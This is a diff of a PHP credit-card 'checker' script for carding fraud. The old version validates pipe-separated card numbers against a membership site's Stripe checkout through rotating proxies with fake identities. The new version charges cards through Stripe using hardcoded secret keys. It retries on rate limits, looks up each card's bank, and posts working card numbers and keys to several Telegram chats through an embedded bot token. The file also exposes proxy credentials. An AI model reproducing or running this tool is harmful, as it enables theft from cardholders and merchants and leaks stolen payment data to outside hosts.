@@ -1,262 +1,400 @@
 <?php
 
-//============================================================================//
-//=======================[B3 RAW-MADE BY 𝑫𝑹𝑨𝑮𝑶𝑵#𝑴𝑨𝑺𝑻𝑬𝑹]====================//
-//============================================================================//
- 
-
-require 'function.php';
-
 error_reporting(0);
-date_default_timezone_set('Asia/Jakarta');
+date_default_timezone_set('America/Buenos_Aires');
 
-if ($_SERVER['REQUEST_METHOD'] == "POST") {
-    extract($_POST);
-} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
-    extract($_GET);
-}
-function GetStr($string, $start, $end) {
-    $str = explode($start, $string);
-    $str = explode($end, $str[1]);  
-    return $str[0];
-}
-function inStr($string, $start, $end, $value) {
-    $str = explode($start, $string);
-    $str = explode($end, $str[$value]);
-    return $str[0];
-}
-$separa = explode("|", $lista);
-$cc = $separa[0];
-$mes = $separa[1];
-$ano = $separa[2];
-$cvv = $separa[3];
+//================ [ FUNCTIONS & LISTA ] ===============//
 
-function rebootproxys()
-{
-  $poxySocks = file("proxy.txt");
-  $myproxy = rand(0, sizeof($poxySocks) - 1);
-  $poxySocks = $poxySocks[$myproxy];
-  return $poxySocks;
-}
-$poxySocks4 = rebootproxys();
-
-$number1 = substr($ccn,0,4);
-$number2 = substr($ccn,4,4);
-$number3 = substr($ccn,8,4);
-$number4 = substr($ccn,12,4);
-$number6 = substr($ccn,0,6);
-
-function value($str,$find_start,$find_end)
-{
-    $start = @strpos($str,$find_start);
-    if ($start === false) 
-    {
-        return "";
-    }
-    $length = strlen($find_start);
-    $end    = strpos(substr($str,$start +$length),$find_end);
-    return trim(substr($str,$start +$length,$end));
-}
-
-function mod($dividendo,$divisor)
-{
-    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
+function GetStr($string, $start, $end){
+    $string = ' ' . $string;
+    $ini = strpos($string, $start);
+    if ($ini == 0) return '';
+    $ini += strlen($start);
+    $len = strpos($string, $end, $ini) - $ini;
+    return trim(strip_tags(substr($string, $ini, $len)));
 }
 
 
+function multiexplode($seperator, $string){
+    $one = str_replace($seperator, $seperator[0], $string);
+    $two = explode($seperator[0], $one);
+    return $two;
+    };
 
-
-//==================[Randomizing Details]======================//
-$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
-preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
-$name = $matches1[1][0];
-preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
-$last = $matches1[1][0];
-preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
-$email = $matches1[1][0];
-preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
-$street = $matches1[1][0];
-preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
-$city = $matches1[1][0];
-preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
-$state = $matches1[1][0];
-preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
-$phone = $matches1[1][0];
-preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
-$postcode = $matches1[1][0];
-//==================[Randomizing Details-END]======================//
-
-
-//=======================[Proxys]=============================//
-$Websharegay = rand(0,250);
-$rp1 = array(
-  1 => 'wcfsaunx-rotate:agpoevat7mxr',
-    ); 
-    $rotate = $rp1[array_rand($rp1)];
-//////////////////////////==============[Proxy Section]===============//////////////////////////////
-$ch = curl_init('https://api.ipify.org/');
-curl_setopt_array($ch, [
-CURLOPT_RETURNTRANSFER => true,
-CURLOPT_PROXY => 'http://p.webshare.io:80',
-CURLOPT_PROXYUSERPWD => $rotate,
-CURLOPT_HTTPGET => true,
-]);
-$ip1 = curl_exec($ch);
-curl_close($ch);
-ob_flush();  
-if (isset($ip1)){
-$ip = "Live! ✅";
+$idd = $_GET['idd'];
+$amt = $_GET['cst'];
+if(empty($amt)) {
+	$amt = '1';
+	$chr = $amt * 100;
 }
-if (empty($ip1)){
-$ip = "Dead! ❌";
+$sk = $_GET['sec'];
+if(!$sk){
+  #$sk = "";
+$sks = array(
+"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",
+"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",
+"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"
+);
+  $sk = $sks[array_rand($sks)];    
 }
-echo '[ IP: '.$ip.' ] ';
-//=======================[Proxys END]=============================//
+$lista = $_GET['lista'];
+$cc = multiexplode(array(":", "|", ""), $lista)[0];
+$mes = multiexplode(array(":", "|", ""), $lista)[1];
+$ano = multiexplode(array(":", "|", ""), $lista)[2];
+$cvv = multiexplode(array(":", "|", ""), $lista)[3];
+
+if (strlen($mes) == 1) $mes = "0$mes";
+if (strlen($ano) == 2) $ano = "20$ano";
 
 
-//=======================[1 REQ]==================================//
+$userid = $_GET['bot'];
+$userid2 = "@chargedbydarkphoenix";
+$userid3 = "-1001811947326";
+$userid4 = "@ccnbydarkphoenix";
+
+
+//================= [ Bin REQUESTS ] =================//
+
+$bin = substr($cc,0,6);
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-    'authority: api.stripe.com',
-    'method: POST',
-    'path: /v1/payment_methods',
-    'scheme: https',
-    'accept: application/json',
-    'accept-language: en-US,en;q=0.9',
-    'content-type: application/x-www-form-urlencoded',
-    'origin: https://js.stripe.com',
-    'referer: https://js.stripe.com',
-    'sec-fetch-dest: empty',
-    'sec-fetch-mode: cors',
-    'sec-fetch-site: same-origin',
-    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
-));
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=21752bb0-6896-4348-8c9e-0ffff486a728564d55&muid=742cd467-3cf5-43d5-908d-3119da7021af46029e&sid=eeb59224-519b-4cae-a4c9-1cdb4d8d98d98ba756&pasted_fields=number&payment_user_agent=stripe.js%2Fce6ebe825%3B+stripe-js-v3%2Fce6ebe825&time_on_page=15840&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1IKHhQJQRCxZW6Dh');
+curl_setopt($ch, CURLOPT_URL, "https://binlist.io/lookup/$bin/");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$response = json_decode(curl_exec($ch), JSON_PRETTY_PRINT);
+$brand = $response["scheme"];
+$type = $response["type"];
+$category = $response['category'];
+$country = $response["country"]["name"];
+$emoji = $response["country"]["emoji"];
+$CUR = $response["country"]["currency"];
+$bank = $response["bank"]["name"];
 
+//================= [ CURL REQUESTS ] =================//
 
-$result1 = curl_exec($ch);
-$token = trim(strip_tags(getStr($result1,'"id": "','"'))); 
-//=======================[1 REQ-END]==============================//
+function send_message($userid, $msg) {
+$text = urlencode($msg);
+file_get_contents("https://api.telegram.org/bot5929089968:AAFVBq4UvQfYTKyvpfTWSByIVG_P92Ahd8s/sendMessage?chat_id=$userid&text=$text&parse_mode=HTML");
+file_get_contents("https://api.telegram.org/bot5929089968:AAFVBq4UvQfYTKyvpfTWSByIVG_P92Ahd8s/sendMessage?chat_id=$userid2&text=$text&parse_mode=HTML");
+file_get_contents("https://api.telegram.org/bot5929089968:AAFVBq4UvQfYTKyvpfTWSByIVG_P92Ahd8s/sendMessage?chat_id=$userid3&text=$text&parse_mode=HTML");
+file_get_contents("https://api.telegram.org/bot5929089968:AAFVBq4UvQfYTKyvpfTWSByIVG_P92Ahd8s/sendMessage?chat_id=$userid4&text=$text&parse_mode=HTML");
+};
 
+#-------------------[1st REQ]--------------------#
 
-//=======================[2 REQ]==================================//
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://thechattymammoth.com/membership-account/membership-checkout/');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-    'authority: thechattymammoth.com',
-    'method: POST',
-    'path: /membership-account/membership-checkout/',
-    'scheme: https',
-    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-language: en-US,en;q=0.9',
-    'content-type: application/x-www-form-urlencoded',
-    'cookie: localTimeZone=GMT+0530; isReturningVisitor60=true; wpf_ref[original_ref]=https%3A%2F%2Fthechattymammoth.com%2Fmembership-account%2Fmembership-checkout%2F; wpf_ref[landing_page]=%2F%3FwmcAction%3DwmcTrack%26action_name%3DMembership%2520Checkout%2520%257C%2520The%2520Chatty%2520Mammoth%26siteId%3D1%26rec%3D1%26rand%3D920058%26h%3D16%26m%3D34%26s%3D38%26url%3Dhttps%253A%252F%252Fthechattymammoth.com%252Fmembership-account%252Fmembership-checkout%252F%26uid%3D0%26pid%3D60%26visitorId%3D891625e7f825f2b5%26fvts%3D1666609479%26vc%3D1%26idn%3D0%26refts%3D0%26lvts%3D1666609479%26fullRef%3Dthechattymammoth.com%252Fmembership-account%252Fmembership-checkout%252F%26send_image%3D1%26pdf%3D1%26qt%3D0%26rp%3D0%26wma%3D0%26dir%3D0%26fla%3D0%26java%3D0%26gears%3D0%26ag%3D0%26cookie%3D1%26res%3D1920x1080%26gtms%3D1012%26pvId%3Djmeb0U%26browser%3DChrome_106%26os%3DWindows_10%26device%3DDesktop; _gid=GA1.2.72460498.1666609482; _fbp=fb.1.1666609482576.689076636; __stripe_mid=742cd467-3cf5-43d5-908d-3119da7021af46029e; __insp_uid=3167980386; _wsm_ses_1_8c43=*; PHPSESSID=35f40e1c6cefeee25f1d64b2c3f20cfa; __stripe_sid=eeb59224-519b-4cae-a4c9-1cdb4d8d98d98ba756; __insp_wid=334198115; __insp_nv=false; __insp_targlpu=aHR0cHM6Ly90aGVjaGF0dHltYW1tb3RoLmNvbS9tZW1iZXJzaGlwLWFjY291bnQvbWVtYmVyc2hpcC1jaGVja291dC8%3D; __insp_targlpt=TWVtYmVyc2hpcCBDaGVja291dCB8IFRoZSBDaGF0dHkgTWFtbW90aA%3D%3D; __insp_sid=930434628; __insp_msld=true; pmpro_visit=1; sc_is_visitor_unique=rx12662336.1666684234.B9C93F94AC634FBAFD5A9EE2AF8E547A.2.2.2.2.2.2.1.1.1; _ga=GA1.1.1486714412.1666609482; _gat_gtag_UA_190268258_1=1; __insp_pad=6; _ga_F8R6BBG74R=GS1.1.1666683710.2.1.1666684257.0.0.0; _wsm_id_1_8c43=891625e7f825f2b5.1666609479.2.1666684259.1666683706; __insp_slim=1666684268597',
-    'origin: https://thechattymammoth.com',
-    'referer: https://thechattymammoth.com/membership-account/membership-checkout/',
-    'sec-fetch-dest: document',
-    'sec-fetch-mode: navigate',
-    'sec-fetch-site: same-origin',
-    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
-));
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=1&checkjavascript=1&other_discount_code=&username='.$name.'444&bemail='.$email.'&bemail='.$email.'&password='.$name.'2444&password2_copy=1&first_name='.$name.'&last_name='.$last.'&bconfirmemail_copy=1&fullname=&CardType=visa&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$token.'&AccountNumber=XXXXXXXXXXXX1704&ExpirationMonth=12&ExpirationYear=2022');
+$x = 0;  
 
-$result2 = curl_exec($ch);
-$info = curl_getinfo($ch);
-$time = $info['total_time'];
+while(true)  
 
-//=======================[2 REQ-END]==============================//
+{  
 
-//===========================================[Responses]========================================//
+$ch = curl_init();  
 
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
 
-if(strpos($result2, 'Thanks for')) {
-  
-    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED ✅ @mtctechx</span><br>';
-    exit;
-    }
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
 
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
 
-elseif(strpos($result2, "Your card has insufficient funds.")) {
-  
-    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV INSUFFICIENT FUNDS ⚠️</span><br>';
-    exit;
-    }
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
 
- 
-elseif(strpos($result2, "Your card’s security code is incorrect.")) {
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
 
-    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅</span><br>';
-    }    
- 
- 
-elseif(strpos($result2, "Your card was declined.")) {
-    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ❌ </span><br>';
-    }
+curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
 
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');  
 
-elseif(strpos($result2, "Your card number is incorrect.")) {
-    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER ❌ </span><br>';
-    }
+$result1 = curl_exec($ch);  
 
-elseif(strpos($result1, "Your card number is incorrect.")) {
-    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER ❌ </span><br>';
-    }
+$tok1 = Getstr($result1,'"id": "','"');  
 
+$msg = Getstr($result1,'"message": "','"');  
+
+//echo "<br><b>Result1: </b> $result1<br>";  
+
+if (strpos($result1, "rate_limit"))   
+
+{  
+
+    $x++;  
+
+    continue;  
+
+}  
+
+break;  
+
+}
+
+#-------------------[2nd REQ]--------------------#
+
+$x = 0;  
+
+while(true)  
+
+{  
+
+$ch = curl_init();  
+
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  
+
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
+
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
+
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
+
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
+
+curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
+
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=𝙅𝙚𝙩𝙞𝙭 Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
+
+$result2 = curl_exec($ch);  
+
+$tok2 = Getstr($result2,'"id": "','"');  
+
+$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  
+
+//echo "<br><b>Result2: </b> $result2<br>";  
+
+if (strpos($result2, "rate_limit"))   
+
+{  
+
+    $x++;  
+
+    continue;  
+
+}  
+
+break;  
+
+}
+
+//=================== [ RESPONSES ] ===================//
+
+if(strpos($result2, '"seller_message": "Payment complete."' )) {
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: $amt $ CCN Charged ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid2, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: $amt $ CCN Charged ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: $amt $ CCN Charged ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' CCN Charged ✅ by 𝙅𝙚𝙩𝙞𝙭  <br>➤  Bin:  '.$brand.' '.$category.' '.$type.'  <br>➤ Bank: '.$bank.'  <br> ➤ Country: '.$country.' '.$emoji.' <br> ➤ Receipt : <a href='.$receipturl.'>Here</a></span><br>';
+}
+elseif(strpos($result2,'"cvc_check": "pass"')){
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: CVV LIVE</span><br>';
+}
+elseif(strpos($result1, "generic_decline")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: GENERIC DECLINED</span><br>';
+}
+elseif(strpos($result2, "generic_decline" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: GENERIC DECLINED</span><br>';
+}
+elseif(strpos($result2, "insufficient_funds" )) {
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: INSUFFICIENT FUNDS</span><br>';
+}
+elseif(strpos($result2, "fraudulent" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: FRAUDULENT</span><br>';
+}
+elseif(strpos($resul3, "do_not_honor" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: DO NOT HONOR</span><br>';
+}
+elseif(strpos($resul2, "do_not_honor" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: DO NOT HONOR</span><br>';
+}
+elseif(strpos($result,"fraudulent")){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: FRAUDULENT</span><br>';
+}
+elseif(strpos($result2,'"code": "incorrect_cvc"')){
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CCN ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CCN ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CCN ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: Security code is incorrect</span><br>';
+}
+elseif(strpos($result1,' "code": "invalid_cvc"')){
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CCN ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CCN ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CCN ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: Security code is incorrect</span><br>';    
+}
+elseif(strpos($result1,"invalid_expiry_month")){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: INVAILD EXPIRY MONTH</span><br>';
+}
+elseif(strpos($result2,"invalid_account")){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: INVAILD ACCOUNT</span><br>';
+}
+elseif(strpos($result2, "do_not_honor")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: DO NOT HONOR</span><br>';
+}
+elseif(strpos($result2, "lost_card" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: LOST CARD</span><br>';
+}
+elseif(strpos($result2, "lost_card" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: LOST CARD</span></span><br>';
+}
+elseif(strpos($result2, "stolen_card" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: STOLEN CARD</span><br>';
+}
+elseif(strpos($result2, "stolen_card" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: STOLEN CARD</span><br>';
+}
+elseif(strpos($result2, "transaction_not_allowed" )) {
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: TRANSACTION NOT ALLOWED</span><br>';
+}
+elseif(strpos($result2, "authentication_required")) {
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: 32DS REQUIRED</span><br>';
+} 
+elseif(strpos($result2, "card_error_authentication_required")) {
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: 32DS REQUIRED</span><br>';
+} 
+elseif(strpos($result2, "card_error_authentication_required")) {
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
